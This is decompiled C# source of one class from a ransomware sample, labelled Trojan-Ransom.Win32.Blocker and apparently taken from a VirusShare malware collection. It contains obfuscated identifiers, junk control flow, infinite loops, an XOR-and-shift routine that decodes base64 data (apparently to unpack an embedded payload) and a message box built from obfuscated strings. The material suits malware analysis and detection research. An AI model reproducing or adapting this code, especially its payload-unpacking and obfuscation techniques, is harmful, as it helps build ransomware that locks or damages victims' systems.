// Decompiled with JetBrains decompiler
// Type: RW.po
// Assembly: RW, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CDB8313E-A884-4C88-9F07-B4D76AB197F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.alrn-962e90f835247ac7446fe053401828dbea8e81b6241ad61f129b6cc5df89effe.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace RW
{
  internal class po
  {
    public static string licate;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static po()
    {
      eWK97ZHZd8El3E8K9m.SbapURvz6slO1();
      po.licate = Application.ExecutablePath;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public po()
    {
      eWK97ZHZd8El3E8K9m.SbapURvz6slO1();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void v9IyWqA64n4z3lM25s4yF2WQ()
    {
      while (true)
        ;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static byte[] O(string File, string key, int amount)
    {
      byte[] numArray = Convert.FromBase64String(File);
      byte[] bytes = Encoding.Default.GetBytes(key);
      int num = checked (numArray.Length - 1);
      int index = 0;
      while (index <= num)
      {
        numArray[index] = checked ((byte) ((int) numArray[index] ^ (int) unchecked ((byte) ((uint) bytes[index % bytes.Length] << (checked (index + amount + bytes.Length) & 7))) & (int) byte.MaxValue));
        checked { ++index; }
      }
      return numArray;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void JUtKNL()
    {
      Decimal num1 = 2439M;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        empvh6dZSo5pSUG8BZ.eF0YZf0gO(674);
        ProjectData.ClearProjectError();
      }
      num1 = 2783M;
      num1 = 0M;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        while (true)
          empvh6dZSo5pSUG8BZ.eF0YZf0gO(684);
      }
      int num2 = (int) Interaction.MsgBox((object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(946));
    }
  }
}
